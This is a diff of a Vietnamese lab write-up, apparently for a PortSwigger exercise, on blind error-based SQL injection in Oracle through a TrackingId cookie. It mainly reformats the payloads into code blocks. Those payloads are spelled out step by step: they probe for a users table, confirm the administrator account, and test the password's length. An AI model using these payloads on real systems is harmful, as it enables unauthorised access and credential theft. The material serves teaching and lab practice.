@@ -6,12 +6,17 @@ Sau khi thử TrackingId để tìm ra cơ sở dữ liệu Lab đang sử dụn
 Nhưng ở đây, mặc dù load thành công mà nó lại không hiển thị lên gì cả (ta xác định nó có thể là blind), do đó chúng ta sẽ thử điều kiện lỗi để xác định.
 
 Sử dụng query như bên dưới, chúng ta có thể áp dụng phép nối chuỗi trong Oracle
-> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT '' FROM DUAL)||'**
+
+```markdown
+**TrackingId=k7oJYXEj2adTxvrq'||(SELECT '' FROM DUAL)||'**
+```
 
 ![](/imgs/SQL-Injection/50.png?raw=true)
 
 Ta sẽ sử dụng query như sau để kiểm tra bảng có tồn tại không (nó sẽ trả về đúng nếu có 1 bảng users tồn tại):
-> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT '' FROM users where rownum=1)||'**
+```markdown
+**TrackingId=k7oJYXEj2adTxvrq'||(SELECT '' FROM users where rownum=1)||'**
+```
 
 ![](/imgs/SQL-Injection/51.png?raw=true)
 
@@ -19,7 +24,9 @@ Kiểm tra như thế đủ rồi, chúng ta sẽ tiến hành inject vào 1 đi
 > **SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual (cheatsheet Oracle database)** ([cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) hân hạnh tài trợ chương trình này....)
 
 Chúng ta sẽ áp dụng vào
-> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT CASE WHEN (1=0) THEN to_char(1/0) ELSE NULL END FROM dual)||'**
+```markdown
+**TrackingId=k7oJYXEj2adTxvrq'||(SELECT CASE WHEN (1=0) THEN to_char(1/0) ELSE NULL END FROM dual)||'**
+```
 
 Hàm to_char để chuyển số hoặc ngày tháng sang chuỗi (nhưng ở đây nó sẽ trả ra lỗi bởi vì đó là phép tính 1/0 :v)
 
@@ -37,14 +44,19 @@ Ta sẽ áp dụng công thức sau đây để tránh bị rối não trước 
 > Đúng + Sai -> Trả về bình thường (do query trả về là NULL)
 
 Chúng ta sẽ tiếp tục
-> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM users where username='administrator')||'**
+```markdown
+**TrackingId=k7oJYXEj2adTxvrq'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM users where username='administrator')||'**
+```
 
 Hoặc chúng ta có thể
-> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT to_char(1/0) FROM users where username='administrator')||'**
+```markdown
+**TrackingId=k7oJYXEj2adTxvrq'||(SELECT to_char(1/0) FROM users where username='administrator')||'**
+```
 
 Nhưng ở phần Solution có gợi ý dùng cái câu điều kiện sai cũng hay hay nên triển luôn =)))
 
 > Vế này đã thêm 1 điều kiện where ở sau, nếu chỉ có 1 điều kiện 1=1 thì nó sẽ trả về error như đã nói ở bên trên, nhưng nếu điều kiện where mà có user là administrator (nó sẽ là True) và nó vẫn sẽ trả về Error.
+
 > Và nếu thay administrator thành 1 user không hề tồn tại nó sẽ load bình thường
 Ví dụ thêm chữ ‘s’ sau administrator => Load bình thường => Chã có user nào administrators (có s) cả.
 
@@ -55,7 +67,10 @@ Còn không có ‘s’ => Load Error => user có tồn tại
 ![](/imgs/SQL-Injection/54.png?raw=true)
 
 Sau khi đã xác nhận administrator có tồn tại thì chúng ta sẽ xác định password có chiều dài bao nhiêu.
-> **TrackingId=k7oJYXEj2adTxvrq'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM users where username='administrator' and LENGTH(password)>50)||'**
+
+```markdown
+**TrackingId=k7oJYXEj2adTxvrq'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM users where username='administrator' and LENGTH(password)>50)||'**
+```
 
 ***Nhắc lại 1 lần nữa, vẫn như ý ở trên, nếu password mà > 50 mà sai nữa => Web load bình thường.
 Còn nếu password nhỏ hơn 50 => Web load Error.***
